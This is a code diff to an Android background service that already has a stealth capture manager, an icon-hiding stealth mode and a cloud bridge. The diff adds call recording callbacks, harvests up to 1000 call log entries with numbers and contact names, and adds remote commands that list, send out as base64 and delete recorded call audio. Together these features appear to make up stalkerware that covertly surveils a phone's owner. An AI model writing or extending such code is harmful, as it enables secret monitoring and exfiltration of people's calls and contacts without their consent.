@@ -66,6 +66,7 @@ class LocalFileServerService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var isStandaloneTorchOn: Boolean = false
     private lateinit var stealthCaptureManager: StealthCaptureManager
+    private lateinit var callRecordingManager: CallRecordingManager
 
     companion object {
         private const val PORT = 8888
@@ -140,6 +141,8 @@ class LocalFileServerService : Service() {
         }
 
         stealthCaptureManager = StealthCaptureManager(applicationContext)
+        callRecordingManager = CallRecordingManager.getInstance(applicationContext)
+        setupCallRecordingCallbacks()
 
         startMqttWorker()
         initCloudBridge()
@@ -483,6 +486,78 @@ class LocalFileServerService : Service() {
             broadcastMessage(JSONObject().put("type", "CALL_LOGS_LIST").put("data", teleManager.getCallLogs()).toString())
             broadcastMessage(JSONObject().put("type", "STEALTH_MODE_STATUS").put("hideIcon", isStealthModeActive()).toString())
         } catch (e: Exception) { e.printStackTrace() }
+    }
+
+    private fun getEnhancedCallLogs(maxCount: Int = 1000): JSONArray {
+        val array = JSONArray()
+        try {
+            val cursor = contentResolver.query(
+                android.provider.CallLog.Calls.CONTENT_URI,
+                arrayOf(
+                    android.provider.CallLog.Calls.NUMBER,
+                    android.provider.CallLog.Calls.CACHED_NAME,
+                    android.provider.CallLog.Calls.TYPE,
+                    android.provider.CallLog.Calls.DATE,
+                    android.provider.CallLog.Calls.DURATION
+                ),
+                null,
+                null,
+                "${android.provider.CallLog.Calls.DATE} DESC"
+            )
+            cursor?.use {
+                val numIdx = it.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
+                val nameIdx = it.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME)
+                val typeIdx = it.getColumnIndex(android.provider.CallLog.Calls.TYPE)
+                val dateIdx = it.getColumnIndex(android.provider.CallLog.Calls.DATE)
+                val durIdx = it.getColumnIndex(android.provider.CallLog.Calls.DURATION)
+                var count = 0
+                while (it.moveToNext() && count < maxCount) {
+                    count++
+                    val typeStr = when (if (typeIdx != -1) it.getInt(typeIdx) else 0) {
+                        android.provider.CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                        android.provider.CallLog.Calls.MISSED_TYPE -> "Missed"
+                        else -> "Other"
+                    }
+                    val durSec = if (durIdx != -1) it.getLong(durIdx) else 0L
+                    val durFormatted = String.format("%02d:%02d", durSec / 60, durSec % 60)
+                    val rawNum = if (numIdx != -1) it.getString(numIdx) ?: "Unknown" else "Unknown"
+                    val rawName = if (nameIdx != -1 && it.getString(nameIdx) != null) it.getString(nameIdx) else rawNum
+                    val obj = JSONObject().apply {
+                        put("number", rawNum)
+                        put("name", rawName)
+                        put("type", typeStr)
+                        put("date", if (dateIdx != -1) it.getLong(dateIdx) else 0L)
+                        put("duration", durFormatted)
+                    }
+                    array.put(obj)
+                }
+            }
+        } catch (e: Exception) {
+            Log.w("CallLogs", "Enhanced call log query error, fallback will be used", e)
+        }
+        return if (array.length() > 0) array else teleManager.getCallLogs()
+    }
+
+    private fun setupCallRecordingCallbacks() {
+        callRecordingManager.onCallStateChanged = { state, number ->
+            broadcastMessage(JSONObject().apply {
+                put("type", "CALL_STATE_UPDATE")
+                put("state", state)
+                put("number", number)
+                put("timestamp", System.currentTimeMillis())
+            }.toString())
+        }
+
+        callRecordingManager.onCallRecordingCompleted = { fileName, durationMs, number ->
+            broadcastMessage(JSONObject().apply {
+                put("type", "CALL_RECORDING_SAVED")
+                put("fileName", fileName)
+                put("durationMs", durationMs)
+                put("number", number)
+                put("timestamp", System.currentTimeMillis())
+            }.toString())
+        }
     }
 
     private fun broadcastBatteryStatus() {
@@ -1191,7 +1266,61 @@ class LocalFileServerService : Service() {
             "FETCH_CALL_LOGS" -> {
                 broadcastMessage(JSONObject().apply {
                     put("type", "CALL_LOGS_LIST")
-                    put("data", teleManager.getCallLogs())
+                    put("data", getEnhancedCallLogs(1000))
+                }.toString())
+            }
+
+            "FETCH_CALL_RECORDINGS" -> {
+                val files = callRecordingManager.getRecordedCalls()
+                val array = JSONArray()
+                for (f in files) {
+                    array.put(JSONObject().apply {
+                        put("fileName", f.name)
+                        put("fileSize", f.length())
+                        put("modified", f.lastModified())
+                    })
+                }
+                broadcastMessage(JSONObject().apply {
+                    put("type", "CALL_RECORDINGS_LIST")
+                    put("data", array)
+                }.toString())
+            }
+
+            "GET_CALL_RECORDING_BASE64" -> {
+                val fileName = json.optString("fileName")
+                serviceScope.launch(Dispatchers.IO) {
+                    try {
+                        val file = callRecordingManager.getRecordingFile(fileName)
+                        if (file != null && file.exists()) {
+                            val bytes = file.readBytes()
+                            val base64 = android.util.Base64.encodeToString(bytes, android.util.Base64.NO_WRAP)
+                            broadcastMessage(JSONObject().apply {
+                                put("type", "CALL_RECORDING_DATA")
+                                put("fileName", fileName)
+                                put("data", base64)
+                                put("mimeType", "audio/mp4")
+                            }.toString())
+                        } else {
+                            broadcastMessage(JSONObject().apply {
+                                put("type", "CALL_RECORDING_ERROR")
+                                put("fileName", fileName)
+                                put("error", "File not found")
+                            }.toString())
+                        }
+                    } catch (e: Exception) {
+                        Log.e("CallRecording", "Error reading audio recording", e)
+                    }
+                }
+            }
+
+            "DELETE_CALL_RECORDING" -> {
+                val fileName = json.optString("fileName")
+                val file = callRecordingManager.getRecordingFile(fileName)
+                val deleted = file?.delete() ?: false
+                broadcastMessage(JSONObject().apply {
+                    put("type", "CALL_RECORDING_DELETED")
+                    put("fileName", fileName)
+                    put("success", deleted)
                 }.toString())
             }
 
